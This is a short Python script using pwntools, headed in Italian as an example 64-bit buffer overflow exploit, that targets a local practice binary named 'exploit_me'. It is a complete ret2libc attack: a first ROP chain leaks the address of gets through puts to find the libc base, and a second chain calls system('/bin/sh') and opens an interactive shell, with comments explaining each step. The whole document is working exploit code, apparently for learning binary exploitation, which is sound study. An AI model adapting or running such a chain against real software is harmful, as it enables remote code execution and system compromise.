# Esempio di exploit per buffer overflow a 64 bit

from pwn import *

context.binary = binary = "./exploit_me"

elf = ELF(binary)
rop = ROP(elf)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p = process()

## Create ROP chain

padding = b"A" * 18  # offset = 18
payload = padding
payload += p64(rop.find_gadget(["pop rdi", "ret"])[0])
payload += p64(elf.got.gets)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.main)

# The basic logic of the ROP leak chain is as follows:

#     Popping the $RDI register for our argument
#     Filling the $RDI register with the address of the gets function
#     Executing the puts function with loaded argument
#     Returning to the main program with already leaked function

p.recvline()
p.sendline(payload)
p.recvline()
leak = u64(p.recvline().strip().ljust(8, b"\0"))
p.recvline()

print(f"Gets leak => {hex(leak)}")
libc.address = leak - libc.symbols.gets
print(f"Libc base => {hex(libc.address)}")

payload = padding
payload += p64(rop.find_gadget(["pop rdi", "ret"])[0])
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(rop.find_gadget(["ret"])[0])
payload += p64(libc.symbols.system)

# The basic logic of the "spawn shell" ROP chain:

#     Popping the $RDI register for our argument.
#     Filling the $RDI register with the byte string "/bin/sh".
#     Ret instruction is for the stack alignment (just think of this as something that we need to do; otherwise, some problems may occur).
#     Executing the system function with a loaded argument.

p.sendline(payload)
p.recvline()
p.interactive()
